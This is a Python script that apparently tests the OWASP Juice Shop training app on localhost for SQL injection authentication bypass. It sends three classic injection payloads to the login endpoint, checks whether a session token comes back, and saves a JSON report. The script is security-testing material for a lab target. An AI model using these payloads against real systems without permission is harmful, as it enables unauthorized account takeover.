#!/usr/bin/env python3

import requests
import json
from datetime import datetime

TARGET_URL = "http://localhost:3000"
REPORT_FILE = "sql_injection_results.json"

def test_login_bypass():
    print("\n[*] Testing SQL Injection in login form...")
    
    payloads = [
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1--"
    ]
    
    results = []
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        
        try:
            response = requests.post(
                f"{TARGET_URL}/rest/user/login",
                json={"email": payload, "password": "anything"},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'authentication' in data and 'token' in data['authentication']:
                    print(f"[!] VULNERABLE! Payload worked: {payload}")
                    results.append({
                        "vulnerability": "SQL Injection - Authentication Bypass",
                        "payload": payload,
                        "status": "VULNERABLE",
                        "severity": "CRITICAL"
                    })
                    return results
                    
        except Exception as e:
            print(f"[!] Error: {e}")
    
    if not results:
        print("[+] Login form appears secure")
        results.append({
            "vulnerability": "SQL Injection",
            "status": "SECURE"
        })
    
    return results

def generate_report(results):
    report = {
        "timestamp": datetime.now().isoformat(),
        "target": TARGET_URL,
        "findings": results
    }
    
    with open(REPORT_FILE, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n[*] Report saved to: {REPORT_FILE}")

def main():
    print("="*60)
    print("SQL Injection Security Test")
    print(f"Target: {TARGET_URL}")
    print("="*60)
    
    try:
        response = requests.get(TARGET_URL, timeout=5)
        print("[+] Target is reachable")
    except:
        print("[!] Cannot connect to Juice Shop")
        return
    
    results = test_login_bypass()
    generate_report(results)
    
    print("\n" + "="*60)
    vulnerable = sum(1 for r in results if r.get('status') == 'VULNERABLE')
    print(f"Vulnerabilities Found: {vulnerable}")
    print("="*60)

if __name__ == "__main__":
    main()